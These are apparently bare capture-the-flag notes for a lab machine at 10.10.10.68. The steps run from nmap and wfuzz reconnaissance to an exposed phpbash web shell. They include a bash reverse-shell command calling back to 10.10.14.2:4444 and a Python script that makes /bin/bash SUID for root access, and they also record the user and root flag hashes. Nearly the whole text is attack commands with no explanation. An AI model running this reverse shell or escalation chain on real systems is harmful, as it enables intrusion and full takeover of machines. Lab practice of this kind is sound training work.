furious 10.10.10.68

nmap -sC -sV -Pn -n -p80 10.10.10.68 -oN targeted

wfuzz -c --hc 404 -t 100 -w /usr/share/dirb/wordlists/common.txt http://10.10.10.68/

http://10.10.10.68/dev/phpbash.php

echo "bash -i >& /dev/tcp/10.10.14.2/4444 0>&1" > shell.sh

sudo python3 -m http.server 80

sudo -l

sudo -u scriptmanager bash

cat /home/arrexel/user.txt

## user
2c281f318555dbc1b856957c7147bfc1

find / type f -user scriptmanager 2>/dev/null

nano /scripts/test.py

```python3
import os
os.system("chmod 4755 /bin/bash")
```

ls -l
bash -p

cat /root/root.txt
## root
cc4f0afe3a1026d402ba10329674a8e2
